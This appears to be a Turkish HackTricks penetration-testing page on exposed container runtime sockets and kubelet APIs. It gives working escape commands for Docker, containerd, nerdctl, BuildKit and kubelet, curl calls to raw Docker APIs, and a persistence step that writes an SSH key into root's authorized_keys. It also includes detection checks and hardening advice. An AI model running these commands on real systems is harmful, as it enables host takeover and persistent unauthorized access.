# Runtime API ve Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Gerçek dünyadaki birçok container compromise olayı aslında bir namespace escape ile başlamaz. Bunun yerine runtime control plane'e erişimle başlar. Bir workload, mount edilmiş bir Unix socket veya açık bir TCP listener üzerinden `dockerd`, `containerd`, CRI-O, Podman ya da kubelet ile iletişim kurabiliyorsa attacker daha yüksek ayrıcalıklara sahip yeni bir container talep edebilir, host filesystem'ını mount edebilir, host namespace'lerine katılabilir veya hassas node bilgilerini alabilir. Bu durumlarda runtime API gerçek security boundary'dir ve bu API'nin compromise edilmesi işlevsel olarak host'un compromise edilmesine oldukça yakındır.

Bu nedenle runtime socket exposure, kernel protections'dan ayrı olarak belgelenmelidir. Sıradan seccomp, capabilities ve MAC confinement kullanan bir container bile, `/var/run/docker.sock` veya `/run/containerd/containerd.sock` içine mount edilmişse host compromise'dan yalnızca bir API call uzakta olabilir. Mevcut container'ın kernel isolation'ı tam olarak tasarlandığı şekilde çalışıyor olabilirken runtime management plane tamamen exposed durumda kalabilir.

## Daemon Access Models

Docker Engine, privileged API'sini geleneksel olarak `unix:///var/run/docker.sock` konumundaki local Unix socket üzerinden expose eder. Geçmişte ayrıca `tcp://0.0.0.0:2375` gibi TCP listener'lar veya `2376` üzerindeki TLS-protected bir listener üzerinden remote olarak da expose edilmiştir. Daemon'ı güçlü TLS ve client authentication olmadan remote olarak expose etmek, Docker API'sini fiilen remote root interface'e dönüştürür.

containerd, CRI-O, Podman ve kubelet benzer high-impact surface'ler expose eder. İsimler ve workflow'lar farklıdır, ancak mantık değişmez. Interface caller'ın workload'lar oluşturmasına, host path'lerini mount etmesine, credential'ları almasına veya çalışan container'ları değiştirmesine izin veriyorsa bu interface privileged management channel'dır ve buna uygun şekilde ele alınmalıdır.

Kontrol edilmesi gereken yaygın local path'ler şunlardır:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Daha eski veya daha özelleşmiş stack'ler `dockershim.sock`, `frakti.sock` veya `rktlet.sock` gibi endpoint'leri de açığa çıkarabilir. Bunlar modern ortamlarda daha az yaygındır; ancak karşılaşıldıklarında, normal application socket'leri yerine runtime-control yüzeylerini temsil ettikleri için aynı dikkatle ele alınmalıdır.

## Secure Remote Access

Bir daemon yerel socket'in ötesinde açığa çıkarılmak zorundaysa bağlantı TLS ile korunmalı ve tercihen mutual authentication kullanılmalıdır; böylece daemon client'ı, client da daemon'ı doğrular. Kolaylık amacıyla Docker daemon'ını plain HTTP üzerinden açma yönündeki eski alışkanlık, container administration'daki en tehlikeli hatalardan biridir; çünkü API surface doğrudan privileged container'lar oluşturabilecek kadar güçlüdür.

Tarihsel Docker configuration pattern'i şöyle görünüyordu:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
systemd tabanlı host'larda daemon iletişimi `fd://` olarak da görünebilir; bu, process'in socket'i doğrudan kendisinin bind etmesi yerine systemd'den önceden açılmış bir socket devraldığı anlamına gelir. Önemli ders, tam syntax değil, bunun güvenlik sonucudur. Daemon sıkı izinlerle korunan yerel bir socket'in ötesinde dinlemeye başladığı anda transport security ve client authentication, isteğe bağlı hardening olmaktan çıkarak zorunlu hâle gelir.

## Abuse

Bir runtime socket mevcutsa hangisi olduğunu, uyumlu bir client bulunup bulunmadığını ve raw HTTP veya gRPC erişiminin mümkün olup olmadığını doğrulayın:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Bu komutlar, erişilemeyen bir yol, bağlanmış ancak erişilemeyen bir socket ve çalışan ayrıcalıklı bir API arasındaki farkı belirlemek için kullanışlıdır. İstemci başarılı olursa sıradaki soru, API'nin host bind mount veya host namespace paylaşımıyla yeni bir container başlatıp başlatamayacağıdır.

### İstemci Yüklü Olmadığında

`docker`, `podman` veya başka bir kullanışlı CLI'nin bulunmaması socket'in güvenli olduğu anlamına gelmez. Docker Engine, Unix socket'i üzerinden HTTP kullanır ve Podman, `podman system service` aracılığıyla hem Docker uyumlu bir API hem de Libpod-native bir API sunar. Bu, yalnızca `curl` bulunan minimal bir ortamın bile daemon'u yönetmek için yeterli olabileceği anlamına gelir:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Bu, post-exploitation sırasında önemlidir; çünkü defender'lar bazen standart client binary'lerini kaldırır ancak management socket'ini mount edilmiş halde bırakır. Podman host'larında, yüksek değerli path'in rootful ve rootless deployment'lar arasında farklılık gösterdiğini unutmayın: rootful service instance'lar için `unix:///run/podman/podman.sock`, rootless olanlar için `unix://$XDG_RUNTIME_DIR/podman/podman.sock`.

### Full Example: Docker Socket To Host Root

`docker.sock` erişilebilirse klasik escape, host root filesystem'ini mount eden yeni bir container başlatmak ve ardından onun içine `chroot` etmektir:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Bu, Docker daemon üzerinden doğrudan host-root çalıştırma olanağı sağlar. Etki yalnızca dosya okumayla sınırlı değildir. Yeni container'ın içine girdikten sonra attacker, host dosyalarını değiştirebilir, credential'ları toplayabilir, persistence yerleştirebilir veya ek privileged workload'lar başlatabilir.

### Tam Örnek: Docker Socket'ten Host Namespace'lerine

Attacker, yalnızca dosya sistemi erişimi yerine namespace'e giriş yapmayı tercih ederse:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Bu yol, mevcut container'ı exploit etmek yerine runtime'dan açıkça host namespace erişimiyle yeni bir container oluşturmasını isteyerek host'a ulaşır.

### Docker Socket Persistence Pattern

Runtime control, one-shot shell yerine persistence için de kullanılabilir. Genel pattern; host mount içeren bir helper container oluşturmak, yetkili erişim materyalini veya bir startup hook'u mount edilen host filesystem'ine yazmak ve ardından host'un bunu tükettiğini doğrulamaktır.

Örnek biçim:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Aynı fikir, operatörün neyi kanıtlamak istediğine bağlı olarak systemd birimlerini, cron parçalarını, uygulama başlangıç dosyalarını veya SSH anahtarlarını hedefleyebilir. Önemli nokta, kalıcı değişikliğin original container içindeki ek privilege aracılığıyla değil, runtime daemon'ın host düzeyindeki dosya sistemi yetkisi üzerinden yapılmasıdır.

### Raw Docker API Helper Pivot

Docker CLI mevcut olmadığında, aynı host-mount helper akışı Unix socket üzerinden HTTP kullanılarak yürütülebilir. Genel akış şöyledir: API'yi doğrula, host bind mount içeren bir helper container oluştur, onu başlat, bir exec instance oluştur ve bu exec'i başlat.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Son `/exec/<id>/start` isteği, döndürülen exec ID'sine bağlıdır; ancak güvenlik açısından temel nokta, kullanılan JSON işlemlerinin ayrıntılarından bağımsızdır: rootful Docker daemon'a ham API erişimi, daha güçlü bir yardımcı workload talep etmek için yeterlidir.

### Tam Örnek: containerd Socket

Bağlanmış bir `containerd` socket'i genellikle aynı derecede tehlikelidir:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Daha Docker benzeri bir client mevcutsa `nerdctl`, `--privileged`, `--pid=host` ve `-v` gibi tanıdık flag'leri sunduğu için `ctr`'den daha kullanışlı olabilir:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Etki yine host ele geçirilmesidir. Docker'a özgü araçlar mevcut olmasa bile başka bir runtime API aynı yönetim gücünü sunabilir. Kubernetes node'larında `crictl`, CRI endpoint'iyle doğrudan konuştuğu için reconnaissance ve container etkileşimi açısından da yeterli olabilir.

### BuildKit Socket

`buildkitd`, insanlar onu genellikle "sadece build backend'i" olarak düşündüğü için kolayca gözden kaçar; ancak daemon hâlâ ayrıcalıklı bir control plane'dir. Erişilebilir bir `buildkitd.sock`, saldırgana arbitrary build step'leri çalıştırma, worker yeteneklerini inceleme, ele geçirilmiş ortamdan local context'leri kullanma ve daemon bunlara izin verecek şekilde yapılandırılmışsa `network.host` veya `security.insecure` gibi tehlikeli entitlement'lar talep etme olanağı sağlayabilir.

İlk etkileşimler için kullanılabilecekler:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Daemon build isteklerini kabul ediyorsa, güvenli olmayan entitlements özelliğinin kullanılabilir olup olmadığını test edin:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Kesin etki daemon yapılandırmasına bağlıdır; ancak permissive entitlements özelliğine sahip rootful BuildKit service, zararsız bir developer kolaylığı değildir. Özellikle CI runners ve paylaşılan build nodes üzerinde bunu yüksek değerli başka bir administrative surface olarak değerlendirin.

### Kubelet API Over TCP

Kubelet bir container runtime değildir, ancak yine de node management plane'in bir parçasıdır ve genellikle aynı trust boundary tartışmasının içinde yer alır. Kubelet secure port `10250` workload içinden erişilebiliyorsa veya node credentials, kubeconfigs ya da proxy rights açığa çıkmışsa attacker, Kubernetes API server admission path'e hiç dokunmadan Pod'ları enumerate edebilir, log'ları retrieve edebilir veya node-local containers içinde command execute edebilir.

Ucuz discovery ile başlayın:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Kubelet veya API-server proxy yolu `exec` işlemini yetkilendiriyorsa, WebSocket destekli bir client bunu node üzerindeki diğer container'larda code execution gerçekleştirmek için kullanabilir. `get` iznine sahip yalnızca `nodes/proxy` yetkisinin göründüğünden daha tehlikeli olmasının nedeni de budur: istek, komut çalıştıran kubelet endpoint'lerine yine ulaşabilir ve bu doğrudan kubelet etkileşimleri normal Kubernetes audit log'larında görünmez.<sup>[[2]](#references)</sup>

## Kontroller

Bu kontrollerin amacı, container'ın güven sınırının dışında kalması gereken herhangi bir yönetim düzlemine ulaşıp ulaşamadığını belirlemektir.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Burada dikkat çekenler:

- Mount edilmiş bir runtime socket'i genellikle yalnızca bilgi ifşası değil, doğrudan bir yönetim primitive'idir.
- TLS olmadan `2375` üzerinde dinleyen bir TCP listener, remote-compromise durumu olarak değerlendirilmelidir.
- `DOCKER_HOST` gibi environment variable'lar çoğu zaman workload'un host runtime ile konuşacak şekilde kasıtlı olarak tasarlandığını ortaya çıkarır.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak yerel Unix socket | `dockerd` yerel socket üzerinde dinler ve daemon genellikle rootful'dur | `/var/run/docker.sock` mount etmek, `tcp://...:2375`'i expose etmek, `2376` üzerinde zayıf veya eksik TLS |
| Podman | Varsayılan olarak daemonless CLI | Olağan yerel kullanım için uzun süre çalışan ayrıcalıklı bir daemon gerekmez; `podman system service` etkinleştirildiğinde API socket'leri yine de expose edilebilir | `podman.sock`'i expose etmek, service'i geniş kapsamlı çalıştırmak, rootful API kullanımı |
| containerd | Yerel ayrıcalıklı socket | Yönetim API'si yerel socket üzerinden expose edilir ve genellikle daha üst düzey tooling tarafından kullanılır | `containerd.sock`'i mount etmek, geniş `ctr` veya `nerdctl` erişimi, ayrıcalıklı namespace'leri expose etmek |
| CRI-O | Yerel ayrıcalıklı socket | CRI endpoint'i node-local trusted component'ler için tasarlanmıştır | `crio.sock`'i mount etmek, CRI endpoint'ini untrusted workload'lara expose etmek |
| Kubernetes kubelet | Node-local yönetim API'si | Kubelet, Pod'lar tarafından geniş kapsamlı şekilde erişilebilir olmamalıdır; kimlik doğrulama ve yetkilendirmeye bağlı olarak erişim pod state'ini, credential'ları ve execution özelliklerini expose edebilir | kubelet socket'lerini veya sertifikalarını mount etmek, zayıf kubelet auth, host networking ile erişilebilir kubelet endpoint'i |

## References

- [1] [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)

{{#include ../../../banners/hacktricks-training.md}}
